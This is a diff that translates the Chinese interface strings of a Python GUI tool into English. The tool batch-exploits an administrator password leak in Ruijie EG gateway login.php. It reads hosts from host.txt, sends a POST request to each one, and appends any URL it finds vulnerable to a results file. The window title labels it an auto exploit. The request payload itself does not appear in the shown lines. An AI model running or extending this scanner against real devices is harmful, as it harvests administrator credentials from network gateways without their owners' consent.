@@ -12,15 +12,15 @@ def ruijie_admin_passwd_leak_exp(url):
     try:
         res = requests.post(newurl,data=data, verify=False, timeout=3)
         if "data" in res.text and "Unrecognized host or address." not in res.text:
-            ruijie_admin_passwd_leak_text.insert(END,"----------------------------------\n【！！！！！！】存在漏洞的url：" + newurl + "\n----------------------------------\n")
+            ruijie_admin_passwd_leak_text.insert(END,"----------------------------------\n[! ! ! ! ! ! ] Vulnerable url:" + newurl + "\n----------------------------------\n")
             ruijie_admin_passwd_leak_text.see(END)
-            with open ("存在锐捷 EG易网关 login.php 管理员账号密码泄露漏洞的url.txt", 'a') as f:
+            with open ("[exists]ruijie_admin_passwd_leak_url.txt", 'a') as f:
                 f.write(newurl + "\n")
         else:
-            ruijie_admin_passwd_leak_text.insert(END,"【×】不存在漏洞的url：" + newurl + "\n")
+            ruijie_admin_passwd_leak_text.insert(END,"[×]URL without vulnerability:" + newurl + "\n")
             ruijie_admin_passwd_leak_text.see(END)
     except Exception as err:
-        ruijie_admin_passwd_leak_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
+        ruijie_admin_passwd_leak_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
         ruijie_admin_passwd_leak_text.see(END)
 def get_ruijie_admin_passwd_leak_addr():
     with open("host.txt","r") as f:
@@ -30,7 +30,7 @@ def get_ruijie_admin_passwd_leak_addr():
 def ruijie_admin_passwd_leak_gui():
     ruijie_admin_passwd_leak = Toplevel()
     ruijie_admin_passwd_leak.geometry("1035x455")
-    ruijie_admin_passwd_leak.title("锐捷 EG易网关 login.php 管理员账号密码泄露漏洞一把梭")
+    ruijie_admin_passwd_leak.title("Ruijie Gateway administrator account password leaked [auto-muti-exp]")
     ruijie_admin_passwd_leak.resizable(0, 0)
     logo = PhotoImage(file="./logo.ico")
     ruijie_admin_passwd_leak.tk.call('wm', 'iconphoto', ruijie_admin_passwd_leak._w, logo)
